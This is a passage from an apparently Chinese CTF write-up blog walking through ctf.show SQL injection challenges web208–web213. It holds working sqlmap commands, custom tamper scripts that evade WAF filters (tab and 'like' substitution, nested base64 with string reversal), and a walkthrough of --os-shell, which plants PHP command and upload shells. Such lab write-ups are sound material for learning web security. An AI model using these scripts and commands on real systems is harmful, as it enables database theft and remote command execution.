<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web207/2S3L6W4G6O0_Q%7D50U93_%258M.png" alt=""></p>
<h3 id="web208"><a class="header-anchor" href="#web208">¶</a>web208</h3>
<p>观察返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在上一题的基础上多过滤了关键字select，但注意这里只是过滤了小写的select，而sqlmap跑的payload一般都是大写的SELECT，所以继续用上一题我们写的tamper脚本即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;03f47587-126e-41eb-bf12-4b246ef155e9.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;03f47587-126e-41eb-bf12-4b246ef155e9.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure>
<h3 id="web209"><a class="header-anchor" href="#web209">¶</a>web209</h3>
<p>观察返回逻辑，写了个正则表达式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;TODO 未完工</span><br><span class="line">   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了<code>*</code>和<code>=</code>符号，我们可以用like编写，在前面的tamper脚本基础上我们改一下，这里我们只用绕过<code>=</code>号就行，<code>*</code>并不影响</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                retVal += chr(<span class="number">0x9</span>) + <span class="string">&#x27;like&#x27;</span> + chr(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += chr(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;5cb7a6b4-1596-4419-a3c2-8f1311e43bb5.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5cb7a6b4-1596-4419-a3c2-8f1311e43bb5.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast --dbms &quot;mysql&quot; --threads 3 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure>
<h3 id="web210"><a class="header-anchor" href="#web210">¶</a>web210</h3>
<p>观察返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;对查询字符进行解密</span><br><span class="line">  function decode($id)&#123;</span><br><span class="line">    return strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>套娃base64编码和字符串反转，我们按照他的逻辑反着写tamper即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;b1cd1011-2aaf-4e10-8dbf-1a68dbd1e741.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;b1cd1011-2aaf-4e10-8dbf-1a68dbd1e741.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast --dbms &quot;mysql&quot; -D ctfshow_web -T ctfshow_flavi -C ctfs</span><br><span class="line">how_flagxx --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web210/V8LA%28GW%248%7DH5_PEUUI%5D5XZD.png" alt=""></p>
<h3 id="web211"><a class="header-anchor" href="#web211">¶</a>web211</h3>
<p>查看逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>多增加了一个空格过滤，我们改改脚本，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    retVal = retVal.encode()</span><br><span class="line">    retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;497e212a-5e74-455f-8188-48031701300a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;497e212a-5e74-455f-8188-48031701300a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump</span><br></pre></td></tr></table></figure>
<h3 id="web212"><a class="header-anchor" href="#web212">¶</a>web212</h3>
<p>观察逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在前一题基础上正则多过滤了<code>*</code>，所以我们不能使用<code>/**/</code>来替换空格，换成之前说的tab来绕过，所以改一下tamper脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    payload = bypass(payload)</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.encode()</span><br><span class="line">    retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>(<span class="params">payload</span>):</span></span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="keyword">if</span> payload[i]==<span class="string">&quot; &quot;</span>:</span><br><span class="line">            retVal += chr(<span class="number">0x9</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;19730fa8-da86-4bbe-b12a-bf0d436b20c7.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;19730fa8-da86-4bbe-b12a-bf0d436b20c7.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --</span><br><span class="line">dump</span><br></pre></td></tr></table></figure>
<h3 id="web213"><a class="header-anchor" href="#web213">¶</a>web213</h3>
<p>观察逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和上一题一样，不过这题让我们使用<code>--os-shell</code>的方法，我们就换成使用<code>--os-shell</code>吧。首先要了解一下什么是<code>--os-shell</code></p>
<blockquote>
<p><strong>–os-shell</strong> 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>
不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p>
<p>在mysql中，由 <strong>secure_file_priv</strong> 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出</p>
</blockquote>
<p>我们可以实验一下，payload如下（要记得加上我们之前的tamper脚本绕过waf哦）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;bb22b06a-fa2f-468b-a261-672dc1165e77.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;bb22b06a-fa2f-468b-a261-672dc1165e77.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;dotast --os-shell</span><br></pre></td></tr></table></figure>
<p>因为靶机是php环境，所以我们选择4；目录选择1默认路径即可<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web213/R6Z38V58%29%284%7D%29%5D8W%7DIVYMXE.png" alt="">可以看到成功获得了交互式shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web213/6DKIT%40G8V%7BVO6N_4%24%7B%5B%7B54B.png" alt="">细心的朋友们可以发现，上图中出现了两个php文件，分别是tmpbvrci.php和tmpuuydd.php，这就是前面所提到的sqlmap上传的两个shell文件。我们分别访问一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web213/VT%7DOZRE7%25TRZLK29VC3C86H.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web213/HYG%29CTK8I4HIRP8%24%5BP%29A%24%28V.png" alt="">tmpbvrci.php就是提供给我们执行命令，而tmpuuydd.php就是提供给我们进行文件上传。到这里，相信你们对–os-shell基本原理都了解了；<br>
至于flag，可以在前面的交互性shell拿到，也可以在tmpuuydd.php上传webshell连接服务器拿到<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web213/%5B4X%2836_FS%25RSM%40EBBYK8%5DKR.png" alt=""></p>
<h3 id="web214"><a class="header-anchor" href="#web214">¶</a>web214</h3>
<p>sql实在做吐了，改天回来继续更新~</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
